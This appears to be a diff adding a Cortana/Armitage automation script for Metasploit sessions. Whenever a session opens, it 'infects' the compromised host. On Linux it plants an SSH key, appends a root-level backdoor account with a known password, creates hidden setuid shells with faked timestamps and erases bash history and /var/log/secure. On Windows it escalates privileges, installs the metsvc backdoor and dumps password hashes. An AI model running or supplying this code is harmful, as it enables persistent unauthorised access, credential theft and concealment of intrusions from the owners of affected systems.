@@ -1,0 +1,56 @@
+# Script
+#
+global('%infected');
+$local_ip = lhost();
+
+on session_open {
+	println("runningthis");
+	$rhost = session_host($1);
+	if(%infected[session_host($1)] != "1") {
+		if(host_os(session_host($1)) eq "Linux") {
+			if(-isshell $1) {
+				say("Infecting " . session_host($1));
+				s_cmd($1, "mkdir /root/.ssh");
+				$handle = openf("/root/.ssh/id_rsa.pub");
+				$pub_key = readln($handle);
+				s_cmd($1, "echo $pub_key >> /root/.ssh/authorized_keys");
+				closef($handle);
+				$handle = openf("/root/red/postex/unix/persist/users.txt");
+				#Will probably change this
+				while $text (readln($handle)) {
+					s_cmd($1, "$text");
+					#add some to sudoers
+				}
+				closef($handle);
+				s_cmd($1, "echo 'administrator:\$6\$W6D9sKYe\$tPihBsmoYXNNBfDhmkT30tYqMdCtMN.zn9HpczbzVd0YMw9P5dAQnjQ4KqUN/4IG5xs4t1SUZP5k82vi5UWGc0:15578:0:99999:7:::' >> /etc/shadow"); # pass = abc123
+				s_cmd($1, "echo 'administrator:x:0:0:nobody,,,,:/:/bin/bash' >>/etc/passwd");
+				$ssh = "creds --add " . session_host($1) . " -p 22 -u administrator -P abc123";
+				cmd_async($ssh);
+
+				s_cmd($1, "cat /etc/passwd | sort > /tmp/pass");
+				s_cmd($1, "cat /tmp/pass > /etc/passwd && rm /tmp/pass");
+
+
+				#Create backup shells
+				s_cmd($1, "cp /bin/zsh /.kernel; chmod +sss /.kernel; touch -d '4 May 2004' /.kernel; chattr +i /.kernel");
+				s_cmd($1, "cp /bin/tcsh /tmp/X11.auth; chmod +sss /tmp/X11.auth; touch -d '4 May 2004' /tmp/X11.auth");
+
+				#cover those tracks
+				s_cmd($1, "chmod 700 .bash_history");
+				s_cmd($1, "chmod 600 .bash_history");
+				s_cmd($1, "echo '' > .bash_history");
+				s_cmd($1, "chattr +i .bash_history");
+				s_cmd($1, "rm -f /var/log/secure");
+				s_cmd($1, "history -c");
+			}
+		}
+		else if (host_os(session_host($1)) eq "Microsoft Windows"){
+			if(-iswinmeterpreter $1){
+				m_cmd($1, "getsystem");
+				m_cmd($1, "run metsvc");
+
+				m_cmd($1, "run hashdump");
+			}
+		}
+	}
+}
